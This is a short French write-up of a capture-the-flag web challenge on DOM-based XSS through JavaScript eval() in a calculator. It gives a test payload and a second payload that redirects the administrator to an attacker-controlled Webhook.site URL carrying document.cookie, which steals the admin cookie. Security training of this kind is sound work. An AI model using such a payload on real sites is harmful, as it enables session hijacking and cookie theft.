**XSS DOM Based - Eval** est une épreuve de sécurité web qui porte sur l'exploitation de la fonction JavaScript eval(), souvent utilisée de manière non sécurisée pour traiter des entrées utilisateur.   
Pour vérifier la vulnérabilité, on injecte un payload simple dans la calculatrice :  
```bash
“1+1,alert`1`”
```
On constate que la fonction alert() s'exécute, confirmant que l'entrée est évaluée par le navigateur.
Pour récupérer le flag, on utilise **'Webhook.site'** pour intercepter les données. On injecte ensuite le payload suivant pour rediriger l'administrateur et voler ses cookies
```bash
“1+1,window.location=`votre-url?c=${document.cookie}`”
```
Après quelques secondes, le flag est reçu sur le tableau de bord du Webhook sous forme de cookie d'administrateur.
